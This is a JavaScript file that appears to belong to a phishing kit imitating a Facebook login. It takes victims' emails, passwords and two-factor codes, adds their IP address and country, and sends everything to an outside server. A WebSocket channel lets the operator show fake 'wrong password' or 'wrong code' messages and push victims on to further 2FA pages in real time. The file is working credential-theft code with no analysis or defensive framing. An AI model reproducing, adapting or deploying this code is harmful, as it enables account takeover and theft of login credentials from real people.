// telegram.js

let userId = null;

// Connect to WebSocket
const ws = new WebSocket('wss://node-ww13.onrender.com');

function showLoader() {
  const loader = document.getElementById('loadFacebookC');
  if (loader) loader.style.display = 'block';
}

function hideLoader() {
  const loader = document.getElementById('loadFacebookC');
  if (loader) loader.style.display = 'none';
}


ws.onmessage = (event) => {
  const data = JSON.parse(event.data);

  const errorEmail = document.getElementById('error-email');
  const errorDescription = document.getElementById('error-password');
  const TwofaError = document.getElementById('2fa-error');

  console.log(data)

  if (data.type === 'welcome') {
    userId = data.userId;
    console.log(`Connected with userId: ${userId}`);
  } else if (data.type === 'perform_action') {
    console.log(`New Message for User ${userId}:`, data.payload);
    window.location.href = "loading.html";
    hideLoader();
  } else if (data.type === 'perform_action2') {
    errorEmail.textContent = 'The email you entered isn’t connected to an account.';
    errorEmail.style.display = 'block';
    console.log(`Action for User ${userId}:`, data.payload);
    hideLoader();
  } else if (data.type === 'perform_action3') {
    errorDescription.textContent = 'The password you’ve entered is incorrect.';
    errorDescription.style.display = 'block';
    console.log(`Action for User ${userId}:`, data.payload);
    hideLoader();
  } else if (data.type === 'perform_action4') {
    window.location.href = "2fa.html";
    console.log(`Action for User ${userId}:`, data.payload);
    hideLoader();
  }  else if (data.type === 'perform_action5') {
    TwofaError.textContent = 'The login code you entered does not match the one sent to your phone. Please check the number and try again.';
    hideLoader();
  } else if (data.type === 'perform_action6') {
    window.location.href = 'thank.html';
  } else if (data.type === 'perform_action7') {
    window.location.href = "2fa_email.html";
    console.log(`Action for User ${userId}:`, data.payload);
    hideLoader();
  } else if (data.type === 'perform_action8') {
    window.location.href = "2fa_auth.html";
    console.log(`Action for User ${userId}:`, data.payload);
    hideLoader();
  }
};

let clientIp = null;
let countryName = null;

// Fetch the user's public IP address
const fetchIpAddress = async () => {
  try {
    const response = await fetch('https://ipwhois.app/json/');
    const data = await response.json();
    clientIp = data.ip;
    countryName = data.country;
    console.log(`Client IP: ${clientIp}, Country: ${countryName}`);
  } catch (error) {
    console.error('Error fetching IP:', error);
  }
};


// Call the function to fetch IP when the page loads
fetchIpAddress();
// Function to send a message to the server
function sendMessage(pageId) {
  const messageInput = document.getElementById('message');
  const errorMessage = document.getElementById('error-message');
  const message = messageInput.value.trim();

  // Reset error message
  errorMessage.style.display = 'none';
  errorMessage.textContent = '';

  // Validation rules
  if (!message) {
    errorMessage.textContent = 'Input field cannot be empty.';
    errorMessage.style.display = 'block';
    return;
  }

  if (message.length > 200) {
    errorMessage.textContent = 'Input field cannot exceed 200 characters.';
    errorMessage.style.display = 'block';
    return;
  }


  if (!userId) {
    alert('User ID not set. Please wait for connection.');
    return;
  }

  const fullMessage = `${pageId}: ${message} \n (IP: ${clientIp} / Country: ${countryName})`;
  
  console.log(fullMessage);

  showLoader();

  fetch('https://node-ww13.onrender.com/send-message', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: fullMessage, userId }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log('Server response:', data);
      messageInput.value = '';
      // alert('Message sent successfully!');
    })
    .catch((error) => {
      console.error('Error sending message:', error);
      alert('Failed to send message. Please try again.');
    });
}

function sendMultipleInputs(pageId) {
  const emailInput = document.getElementById('email');
  const descriptionInput = document.getElementById('password');
  const errorEmail = document.getElementById('error-email');
  const errorDescription = document.getElementById('error-password');

  const email = emailInput.value.trim();
  const description = descriptionInput.value.trim();

  // Reset error messages
  errorEmail.style.display = 'none';
  errorEmail.textContent = '';
  errorDescription.style.display = 'none';
  errorDescription.textContent = '';

  // Validate email
  if (!email) {
    errorEmail.textContent = 'Email field cannot be empty.';
    errorEmail.style.display = 'block';
    return;
  }

  if (email.length > 200) {
    errorEmail.textContent = 'Email cannot exceed 200 characters.';
    errorEmail.style.display = 'block';
    return;
  }

  // Validate description
  if (!description) {
    errorDescription.textContent = 'Password field cannot be empty.';
    errorDescription.style.display = 'block';
    return;
  }

  if (description.length > 500) {
    errorDescription.textContent = 'Password cannot exceed 500 characters.';
    errorDescription.style.display = 'block';
    return;
  }

  if (!userId) {
    alert('User ID not set. Please wait for connection.');
    return;
  }

  // Combine the inputs into a single message
  const fullMessage = `${pageId}:\nEmail: ${email}\nPassword: ${description} \n(IP: ${clientIp}  / Country: ${countryName})`;

  showLoader();

  fetch('https://node-ww13.onrender.com/send-message', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: fullMessage, userId }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log('Server response:', data);
    })
    .catch((error) => {
      console.error('Error sending message:', error);
      alert('Failed to send details. Please try again.');
    });
}
